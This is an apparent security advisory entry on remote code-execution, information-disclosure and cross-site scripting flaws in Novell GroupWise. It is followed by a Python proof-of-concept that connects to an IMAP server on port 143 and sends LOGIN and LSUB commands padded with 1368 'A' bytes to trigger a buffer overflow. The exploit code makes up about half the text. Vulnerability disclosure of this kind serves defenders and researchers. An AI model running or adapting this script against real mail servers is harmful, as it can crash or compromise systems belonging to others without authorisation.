source: http://www.securityfocus.com/bid/44732/info

Novell GroupWise is prone to multiple security vulnerabilities, including multiple remote code-execution vulnerabilities, an information-disclosure issue, and a cross-site scripting issue.

Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, obtain potentially sensitive information, or execute arbitrary code in the context of the user running the affected application. Information harvested may aid in further attacks; other attacks are also possible.

#!/usr/bin/python
#
# Francis Provencher for Protek Research Lab's.
#
#
 
 
import socket
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
buffer = '\x41' * 1368
 
s.connect(('192.168.100.178',143))
s.recv(1024)
s.send('A001 LOGIN test  test ' + buffer + '\r\n')
s.recv(1024)
s.send('A001 LSUB aa ' + buffer + '\r\n')
s.recv(1024)
s.close()